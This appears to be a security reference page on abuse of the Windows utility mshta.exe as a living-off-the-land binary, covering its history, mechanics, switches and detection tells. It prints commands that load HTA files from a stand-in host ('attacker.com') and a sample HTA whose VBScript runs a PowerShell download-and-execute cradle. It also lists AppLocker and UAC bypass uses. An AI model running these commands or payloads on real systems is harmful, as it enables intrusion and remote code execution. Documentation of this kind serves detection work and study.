# LOLBins — mshta.exe — Overview

> 🔴 **Red Flag Principle:** `mshta.exe` is a browser engine for HTML Applications (HTAs) — standalone applications built with HTML, CSS, and JScript/VBScript. Abuse: when pointed at a remote `.hta` file via `mshta.exe http://attacker.com/payload.hta`, it downloads and runs the file *outside* the browser sandbox, with full system API access and UAC bypass on many Windows versions. The two invariant tells are: (1) the **argument shape itself** — `mshta http(s)://` URL or `mshta file://` URI is unambiguous, survives binary rename; and (2) `mshta.exe` **never spawns a child process for its payload execution** — the HTA code runs inside mshta's own address space, making this one of the few LOLBins where the parent-child spawn chain doesn't help an analyst distinguish attack from legitimate operation.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Legitimate vs. Abused Verbs](#legitimate-vs-abused-verbs)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

`mshta.exe` is not an offensive-security tool — it's a native Windows utility for running HTML Applications (HTAs), included with every Windows installation since Windows 98 and maintained through modern Windows 11. HTAs are a legacy Windows component model allowing HTML/CSS-based applications to run with full system API access (file I/O, registry, WMI, etc.) rather than in the restricted browser sandbox.

> "HTML Application (HTA) files are executable applications that run using the HTML Application Host (mshta.exe). The application runs in the context of the local system using the Trident rendering engine (the IE rendering engine)."
> — [Microsoft Learn documentation on HTA](https://learn.microsoft.com/en-us/previous-versions/ms536471(v=vs.85))

The tool has existed since **Windows 98** (1998) — a legacy component from the era when Windows was transitioning HTML/browser technology toward desktop applications. Modern Windows maintains backward compatibility, but HTAs are rarely used for legitimate applications anymore; most modern developers use .NET, UWP, or web frameworks instead.

Its abuse as a "living-off-the-land binary" — repurposing mshta to load and execute remote `.hta` files that contain embedded JScript/VBScript — is catalogued by the **[LOLBAS Project](https://lolbas-project.github.io/)** (`LOLBAS-Project/LOLBAS` on GitHub), documented in the `Mshta.yml` entry (verified against the live GitHub source), credited to a broad community of researchers including Enrico Cambiaso (pentester), Gremlin Research, and others.

## How It Works

`mshta.exe` exposes one primary abuse pattern:

**Remote/local HTA file loading and execution.** When invoked with a URL (HTTP/HTTPS) or file path (`file://` URI or local/UNC path), `mshta.exe` downloads the `.hta` file (if remote) and executes it. The HTA file itself is HTML markup with embedded `<script>` tags containing JScript or VBScript code.

```
mshta http://attacker.com/payload.hta
    or
mshta file://attacker.com/share/payload.hta
    or
mshta C:\Users\Public\payload.hta

           ↓

mshta.exe downloads (if HTTP/HTTPS) and parses the .hta file
           ↓
HTA file is rendered as an application window; embedded <script> code executes
           ↓
JScript/VBScript code runs with full system API access (no browser sandbox)
           ↓
typical payload: meterpreter, Empire stager, keylogger, file I/O, registry manipulation, etc.
```

Key mechanics:

- **Fileless execution (remote HTA):** The HTA is fetched from a remote server and executed from memory; no standalone file lands on disk unless the operator chooses to save it.
- **No child process:** Everything runs inside the single `mshta.exe` process, producing no parent→child spawn chain.
- **UAC bypass:** On Windows Vista through Windows 7, mshta can bypass UAC prompts in certain configurations (the UAC bypass surface was significantly reduced in Windows 8+, but remnants exist).
- **Full system API access:** Unlike JavaScript in a browser, JScript/VBScript inside an HTA has unrestricted access to `WScript.Shell`, `WScript.Network`, ActiveX controls, file I/O, registry access, WMI, etc.
- **Network flexibility:** Can load from HTTP/HTTPS, local file, UNC path (SMB), or `file://` URIs.

The simplest HTA payload is just HTML with embedded JavaScript/VBScript:

```html
<html>
<script language="vbscript">
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://...')"
</script>
</html>
```

This file, saved as `payload.hta`, run via `mshta http://attacker.com/payload.hta`, downloads and executes a PowerShell stager entirely in-memory, inside mshta's own process.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Transport (remote HTA) | HTTP/HTTPS to fetch the remote HTA file; can also be UNC `\\host\share\file.hta` or `file://` URI |
| Rendering engine | Trident (the IE HTML rendering engine) — mshta.exe *is* a stripped-down IE host for HTA-specific rendering |
| Script engine | JScript or VBScript embedded in the HTA's `<script>` tags — executed by Windows Script Host engine inside mshta's process |
| API access | Full system API via `WScript.Shell`, `WScript.Network`, ActiveX object creation, file I/O (fso object), registry access, WMI queries — **not sandbox-restricted like browser JavaScript** |
| Execution context | Runs as whatever user/token invoked it — **no elevation required** for the HTA execution itself (LOLBAS lists "User" privilege); UAC bypass may occur depending on OS and invocation context |
| Process model | Single process, no children — all work (HTA rendering, script execution) happens inside `mshta.exe` itself |
| Binary location | `C:\Windows\System32\mshta.exe` and `C:\Windows\SysWOW64\mshta.exe` — the two legitimate OS install paths per LOLBAS's `Full_Path` listing |

## Command-Line Switches — Quick Reference

Verified against [Microsoft Learn's mshta reference](https://learn.microsoft.com/en-us/previous-versions/ms536471(v=vs.85)) and the [LOLBAS Project's `Mshta.yml`](https://lolbas-project.github.io/lolbas/Binaries/Mshta/). `mshta` is a minimal utility with very few formal command-line switches; most of what controls its behavior is the filename/URL passed as the first positional argument.

**Core argument (required)**

| Argument | Meaning |
|---|---|
| `<URL or file path>` | The HTA file to execute. Can be: HTTP/HTTPS URL (`http://attacker.com/file.hta`), file:// URI (`file://attacker.com/share/file.hta`), local path (`C:\Users\Public\file.hta`), or UNC path (`\\attacker.com\share\file.hta`). This is the primary, and often only, argument mshta accepts. |

**Optional modifiers (documented in legacy HTA specs, less reliably supported in modern Windows)**

| Flag | Meaning |
|---|---|
| `-embedding` | Legacy undocumented flag; used internally by Windows for OLE embedding of HTA objects. Rarely seen in abuse. |
| `//` | End-of-arguments marker — anything after `//` is passed to the HTA itself as command-line arguments (accessible via `HTA.commandLine` property inside the HTA). |

Most abuse cases use the minimal form: `mshta http://attacker.com/payload.hta` with no additional switches.

## Legitimate vs. Abused Verbs

For contrast, legitimate mshta usage is extremely rare in modern enterprises:

```cmd
mshta.exe "C:\Program Files\LegacyApp\app.hta"
mshta.exe "\\internal.share\apps\legacy_dashboard.hta"
```

These would be a legacy business application shipped as an HTA — a self-contained HTML/script application that needs full system API access for file I/O or registry manipulation. In modern environments, such applications are almost universally migrated to .NET, web frameworks, or UWP. A `mshta http://attacker.com/...` invocation with a remote HTTP URL is not something that workflow produces.

## Quick Use-Case List

- Remote HTA download and execution — fileless code execution via HTTP/HTTPS
- Local HTA file execution — running a pre-staged `.hta` from disk or UNC share
- Silent execution (suppressed HTA window) — embedding the HTA inside an `<iframe>` or using HTA window properties to hide the UI
- Chained download-and-execute one-liner — fetch and run a stager (meterpreter, Empire, etc.) in one command
- Renamed or relocated `mshta.exe` binary — defeating simple image-path-based detection
- UNC-path HTA execution — loading the `.hta` from an internal file share (no outbound Internet traffic)
- UAC bypass via mshta (OS-version-dependent) — circumventing User Account Control prompts on vulnerable Windows versions
- Bypassing AppLocker/WDAC via signed-binary-proxy — `mshta.exe` is Microsoft-signed and allowlisted by default
- Staged secondary payload delivery — post-initial-access foothold staging of a full C2 agent via HTA
- Proxy bypass via HTA (IE proxy auto-config) — using the embedded IE engine to honor proxy settings and bypass direct proxy filters

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on the target | Any existing foothold that can run a command line — a macro, a script, an interactive shell, a C2 task. `mshta.exe` is not itself an initial-access vector |
| Privilege level | **None beyond a standard user token** — HTA execution requires only `User` privilege. UAC bypass (if applicable) depends on OS and invocation context. |
| Network reachability (remote HTA only) | Outbound HTTP/HTTPS to the HTA-hosting URL, or SMB to a UNC share. No network required for local file execution. |
| HTA source | The operator needs the `.hta` file either hosted remotely or available locally/on a UNC share. The HTA is HTML (text) and can be crafted or generated by a payload-generator framework (Empire, msfvenom, etc.). Commonly generated with `msfvenom -f hta-psh` or custom scripts. |
| Target OS version | Windows 98 and later — `mshta.exe` is a long-standing utility. HTA execution is supported across all modern Windows versions (7 through 11), though UAC bypass mitigation has gradually reduced over OS versions. |
